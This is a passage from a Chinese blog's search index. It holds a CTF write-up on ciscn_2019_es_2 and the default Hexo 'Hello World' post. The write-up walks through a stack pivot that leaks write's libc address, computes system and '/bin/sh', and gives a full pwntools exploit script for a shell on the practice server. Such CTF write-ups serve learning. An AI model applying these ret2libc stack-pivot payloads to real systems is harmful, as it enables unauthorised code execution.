src="/img/p1/s10.png"></p><p>所以我们的思路是，</p><ol><li><p>先泄露write函数的真实地址，然后通过计算libc的基地址拿到libc中的system函数的地址，注意write_plt之后的返回地址要返回到main函数，因为两次read不够我们完成整个利用。</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-attr"># 第一次read的payload1</span>和对应bss段中的结构 <br>payload<span class="hljs-number">1</span> = b<span class="hljs-string">&#x27;aaaa&#x27;</span>+p<span class="hljs-number">32</span><span class="hljs-comment">(write_plt)</span>+p<span class="hljs-number">32</span><span class="hljs-comment">(main_addr)</span>+p<span class="hljs-number">32</span><span class="hljs-comment">(1)</span>+p<span class="hljs-number">32</span><span class="hljs-comment">(write_got)</span>+p<span class="hljs-number">32</span><span class="hljs-comment">(4)</span><br></code></pre></td></tr></table></figure><p><img src="/img/p1/s11.png"></p></li><li><p>第二次read我们要将ebp覆盖为bss段的开头（0xa300）、返回地址覆盖为leave_ret，这样栈和bss段的变化就是这样的<br><img src="/img/p1/s12.png"><br>此时的eip实行write_plt(1,write_got,4)，泄露write函数的真实地址</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-attr"># 第二次read的payload2</span> <br>payload<span class="hljs-number">2</span>=cyclic<span class="hljs-comment">(0x18)</span>+p<span class="hljs-number">32</span><span class="hljs-comment">(bss)</span>+p<span class="hljs-number">32</span><span class="hljs-comment">(leave_ret)</span> <br></code></pre></td></tr></table></figure></li></ol><p>这样我就可以拿到了write函数的真实地址，可以计算出system和binsh的地址。<br>3. 在write函数执行完之后，我们的程序会回到main函数，继续第三次read，此时我们在bss段放入system和binsh</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-attr"># 第三次read的payload3</span> <br>payload<span class="hljs-number">3</span>=<span class="hljs-string">&#x27;aaaa&#x27;</span>+p<span class="hljs-number">32</span><span class="hljs-comment">(sys_addr)</span>+p<span class="hljs-number">32</span><span class="hljs-comment">(0xdeadbeef)</span>+p<span class="hljs-number">32</span><span class="hljs-comment">(binsh_addr)</span><br></code></pre></td></tr></table></figure><ol start="4"><li>来到第四次read，将ebp覆盖为3中bss段的开头（0xa300）、返回地址覆盖为leave_ret，执行我们第3步在bss段布置的system(‘&#x2F;bin&#x2F;sh’)</li></ol><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs lua">from pwn import *<br>from LibcSearcher import *<br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>,<span class="hljs-built_in">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-built_in">io</span> = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">28739</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./spwn&#x27;</span>)<br><br># 第一次<span class="hljs-built_in">read</span><br>write_plt = elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got = elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr = elf.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>payload1 = b<span class="hljs-string">&#x27;aaaa&#x27;</span> + p32(write_plt) + p32(main_addr) +  p32(<span class="hljs-number">1</span>) + p32(write_got) + p32(<span class="hljs-number">4</span>)<br><span class="hljs-built_in">io</span>.sendafter(b<span class="hljs-string">&#x27;What is your name?&#x27;</span>,payload1)<br><br># 第二次<span class="hljs-built_in">read</span><br>bss = <span class="hljs-number">0x0804A300</span><br>leave_ret = <span class="hljs-number">0x08048511</span><br>payload2 = cyclic(<span class="hljs-number">0x18</span>)+p32(bss)+p32(leave_ret)<br><span class="hljs-built_in">io</span>.sendafter(b<span class="hljs-string">&#x27;What do you want to say?&#x27;</span>,payload2)<br>write_addr = u32(<span class="hljs-built_in">io</span>.recv(<span class="hljs-number">4</span>))<br>success(hex(write_addr))<br>libc = LibcSearcher(<span class="hljs-string">&#x27;write&#x27;</span>,write_addr)<br>libc_base = write_addr - libc.<span class="hljs-built_in">dump</span>(<span class="hljs-string">&#x27;write&#x27;</span>)<br>system_addr = libc_base + libc.<span class="hljs-built_in">dump</span>(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_addr = libc_base + libc.<span class="hljs-built_in">dump</span>(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br># 第三次<span class="hljs-built_in">read</span><br>payload3 = b<span class="hljs-string">&#x27;aaaa&#x27;</span> + p32(system_addr) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(binsh_addr)<br><span class="hljs-built_in">io</span>.sendafter(b<span class="hljs-string">&#x27;What is your name?&#x27;</span>,payload3)<br><br># 第四次<span class="hljs-built_in">read</span><br>payload4 = cyclic(<span class="hljs-number">0x18</span>)+p32(bss)+p32(leave_ret)<br><span class="hljs-built_in">io</span>.sendafter(b<span class="hljs-string">&#x27;What do you want to say?&#x27;</span>,payload4)<br><br><span class="hljs-built_in">io</span>.interactive()<br></code></pre></td></tr></table></figure></div>]]></content>
    
    
    <categories>
      
      <category>pwn学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈迁移</tag>
      
      <tag>ciscn_2019_es_2</tag>
      
      <tag>Black Watch 入群题-PWN1</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2024/11/02/hello-world/"/>
    <url>/2024/11/02/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
